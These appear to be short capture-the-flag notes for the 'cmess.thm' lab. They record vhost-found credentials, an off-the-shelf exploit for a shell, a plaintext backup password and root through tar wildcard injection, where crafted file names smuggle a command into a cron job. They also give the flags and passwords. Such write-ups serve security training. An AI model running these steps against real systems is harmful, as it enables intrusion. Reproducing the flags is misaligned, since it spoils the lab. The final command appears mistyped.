# Initial foothold

fuzz vhosts:
![[Pasted image 20240504110842.png]]

![[Pasted image 20240504111115.png]]=> creds: andre@cmess.thm KPFTN_f2yxe%

CMS Login: http://cmess.thm/login
Admin panel: http://cmess.thm/admin/

Use the following exploit to get a shell on the system:
`searchsploit -m 51569`

# PrivEsc

## Andre

Find writeable files:
```bash
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```
=> /opt/.password.bak

Content of /opt/.password.bak:
```txt
andres backup password
UQfsdCB7aAP6
```

Login SSH as **andre** with password **UQfsdCB7aAP6** 

User flag: thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}

## Root

List crontab:
![[Pasted image 20240504114400.png]]

Create shell script:
```bash
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash;" > shell.sh
```

Exploit cron backup:
```bash
cd /home/andre/backup
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```

Go to /tmp and wait for the cronjob to finish.

Enjoy the root shell:
```bash
.bash -p
```

![[Pasted image 20240504123059.png]]

Root flag: thm{9f85b7fdeb2cf96985bf5761a93546a2}